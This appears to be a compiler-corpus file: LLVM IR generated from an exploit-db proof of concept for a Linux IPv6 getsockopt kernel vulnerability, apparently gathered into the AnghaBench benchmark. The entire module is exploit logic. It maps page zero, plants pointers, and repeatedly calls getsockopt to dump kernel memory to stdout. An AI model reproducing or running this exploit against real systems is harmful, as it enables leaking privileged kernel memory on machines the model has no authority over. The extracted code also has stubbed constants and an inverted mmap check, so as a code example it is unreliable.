; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_4172.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_4172.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [90 x i8] c"Ipv6_getsockopt_sticky vuln POC\0Adreyer '07 - free feels better\0ADumping %p - %p to stdout\0A\00", align 1
@INIADDR = common dso_local global i32 0, align 4
@ENDADDR = common dso_local global i32 0, align 4
@AF_INET6 = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@IPPROTO_IPV6 = common dso_local global i32 0, align 4
@IPV6_2292PKTOPTIONS = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@HOPOPT_OFFSET = common dso_local global i32 0, align 4
@i = common dso_local global i32 0, align 4
@IPV6_DSTOPTS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"\0A%08x:\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca [10240 x i8], align 16
  %10 = alloca [12 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @stderr, align 4
  %12 = load i32, i32* @INIADDR, align 4
  %13 = load i32, i32* @ENDADDR, align 4
  %14 = call i32 @fprintf(i32 %11, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str, i64 0, i64 0), i32 %12, i32 %13)
  %15 = load i32, i32* @AF_INET6, align 4
  %16 = load i32, i32* @SOCK_STREAM, align 4
  %17 = load i32, i32* @IPPROTO_TCP, align 4
  %18 = call i32 @socket(i32 %15, i32 %16, i32 %17)
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* %6, align 4
  %20 = load i32, i32* @IPPROTO_IPV6, align 4
  %21 = load i32, i32* @IPV6_2292PKTOPTIONS, align 4
  %22 = call i32 @setsockopt(i32 %19, i32 %20, i32 %21, i8* null, i32 0)
  %23 = load i32, i32* @PROT_READ, align 4
  %24 = load i32, i32* @PROT_WRITE, align 4
  %25 = or i32 %23, %24
  %26 = load i32, i32* @MAP_FIXED, align 4
  %27 = load i32, i32* @MAP_ANONYMOUS, align 4
  %28 = or i32 %26, %27
  %29 = load i32, i32* @MAP_PRIVATE, align 4
  %30 = or i32 %28, %29
  %31 = call i8* @mmap(i32* null, i32 4096, i32 %25, i32 %30, i32 0, i32 0)
  store i8* %31, i8** %8, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = icmp ne i8* %32, null
  br i1 %33, label %34, label %37

34:                                               ; preds = %2
  %35 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %36 = call i32 @exit(i32 -1) #3
  unreachable

37:                                               ; preds = %2
  %38 = load i8*, i8** %8, align 8
  %39 = call i32 @memset(i8* %38, i32 0, i32 4096)
  %40 = load i8*, i8** %8, align 8
  %41 = load i32, i32* @HOPOPT_OFFSET, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  store i8* %43, i8** %8, align 8
  %44 = load i32, i32* @INIADDR, align 4
  store i32 %44, i32* @i, align 4
  br label %45

45:                                               ; preds = %77, %37
  %46 = load i32, i32* @i, align 4
  %47 = load i32, i32* @ENDADDR, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %78

49:                                               ; preds = %45
  %50 = load i32, i32* @i, align 4
  %51 = load i8*, i8** %8, align 8
  %52 = bitcast i8* %51 to i32*
  store i32 %50, i32* %52, align 4
  store i32 10240, i32* %7, align 4
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* @IPPROTO_IPV6, align 4
  %55 = load i32, i32* @IPV6_DSTOPTS, align 4
  %56 = getelementptr inbounds [10240 x i8], [10240 x i8]* %9, i64 0, i64 0
  %57 = call i32 @getsockopt(i32 %53, i32 %54, i32 %55, i8* %56, i32* %7)
  %58 = load i32, i32* %7, align 4
  %59 = icmp ugt i32 %58, 0
  br i1 %59, label %60, label %74

60:                                               ; preds = %49
  %61 = getelementptr inbounds [12 x i8], [12 x i8]* %10, i64 0, i64 0
  %62 = load i32, i32* @i, align 4
  %63 = call i32 @sprintf(i8* %61, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i32 %62)
  %64 = getelementptr inbounds [12 x i8], [12 x i8]* %10, i64 0, i64 0
  %65 = getelementptr inbounds [12 x i8], [12 x i8]* %10, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @write(i32 1, i8* %64, i32 %66)
  %68 = getelementptr inbounds [10240 x i8], [10240 x i8]* %9, i64 0, i64 0
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @write(i32 1, i8* %68, i32 %69)
  %71 = load i32, i32* @i, align 4
  %72 = load i32, i32* %7, align 4
  %73 = add i32 %71, %72
  store i32 %73, i32* @i, align 4
  br label %77

74:                                               ; preds = %49
  %75 = load i32, i32* @i, align 4
  %76 = add nsw i32 %75, 4
  store i32 %76, i32* @i, align 4
  br label %77

77:                                               ; preds = %74, %60
  br label %45

78:                                               ; preds = %45
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
